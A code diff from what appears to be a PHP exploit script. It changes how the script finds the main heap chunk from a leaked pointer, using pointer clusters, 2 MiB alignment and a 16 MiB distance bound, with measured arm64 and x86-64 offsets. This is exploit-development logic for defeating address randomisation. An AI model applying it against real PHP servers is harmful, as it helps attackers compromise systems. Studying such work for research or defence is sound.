@@ -69,7 +69,8 @@ def main(argv=None):
     # constant was good enough. On x86-64 the distance came back as 0x200000, 0x600000 and 0x800000 in
     # three fresh containers, and a fixed delta scored 1/3. The window always carries a second cluster of
     # chunk pointers - 454 of them - and that cluster *is* the main chunk, so it is read out of the leak
-    # instead of being assumed.
+    # instead of being assumed. The 454 figure is itself stable: it appeared with 0x400000 on arm64 and
+    # with every x86-64 distance measured.
     main_chunk = disclosed + args.main_delta if args.main_delta is not None else 0
     main_source = ("= disclosed + %#x (fixed delta)" % args.main_delta
                    if args.main_delta is not None else "")
@@ -83,16 +84,14 @@ def main(argv=None):
         libphp_chunk = libphp & ~0x1FFFFF
         candidates = []
         for base, count in clusters.items():
-            if base == disclosed:
+            if base == disclosed or base == libphp_chunk:
                 continue
-            # Pointers into the module bucket into 2 MiB blocks a little above its base (base + symbol
-            # offset crosses the boundary), so excluding "libphp & ~mask" is not enough - the whole
-            # module range has to go.
-            if libphp_chunk <= base < libphp_chunk + (32 << 20):
-                continue
-            # A real neighbouring chunk of this heap is 2 MiB aligned and within a few dozen MiB of the
-            # disclosed one; the small integers that survive a naive pointer test are not.
-            if base & 0x1FFFFF or abs(base - disclosed) > (64 << 20):
+            # A neighbouring chunk of this heap is 2 MiB aligned and sits 2..8 MiB from the disclosed
+            # one: +4 MiB on arm64, +2/+6/+8 MiB on x86-64. The module's own buckets are much further
+            # away -- 21 to 30 MiB in the layouts measured. A 16 MiB bound therefore excludes them while
+            # keeping the real main chunk, which a 32 MiB "module range" blanket did not: on arm64 that
+            # window started at libphp and swallowed main, leaving no candidates at all.
+            if base & 0x1FFFFF or abs(base - disclosed) > (16 << 20):
                 continue
             candidates.append((count, base))
         if not candidates:
